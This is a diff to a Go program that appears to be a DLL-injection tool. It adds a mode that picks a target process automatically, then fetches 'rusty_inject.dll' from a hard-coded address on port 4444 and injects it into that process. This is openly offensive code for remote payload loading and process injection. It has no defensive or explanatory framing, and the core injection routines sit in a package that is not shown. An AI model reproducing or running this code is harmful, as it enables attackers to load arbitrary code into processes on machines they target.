@@ -9,9 +9,8 @@ import (
 	"unsafe"
 )
 
-//var dll_path = "rusty_inject.dll"
-
-func main() {
+// var dll_path = "rusty_inject.dll"
+func param_exec() {
 
 	// Define the command-line options.
 	pidPtr := flag.Int("pid", 0, "Process ID")
@@ -81,5 +80,23 @@ func main() {
 			return
 		}
 	}
+
+}
+func no_param_exec() {
+	dwPID := uint32(inject.Findproc())
+	fmt.Println("PID to inject :", dwPID)
+	loading_type := "url"
+	url := "http://192.168.1.1:4444/rusty_inject.dll"
+	fmt.Println("URL to retrieve the dll :", url)
+	//Run injection with url
+	err := inject.Mainfunc(dwPID, url, loading_type)
+	if err != nil {
+		fmt.Println("Error :", err)
+		return
+	}
+}
+func main() {
+	//no_param_exec() // uncomment if to use embeded arguments
+	param_exec() // comment if previous line is used
 
 }
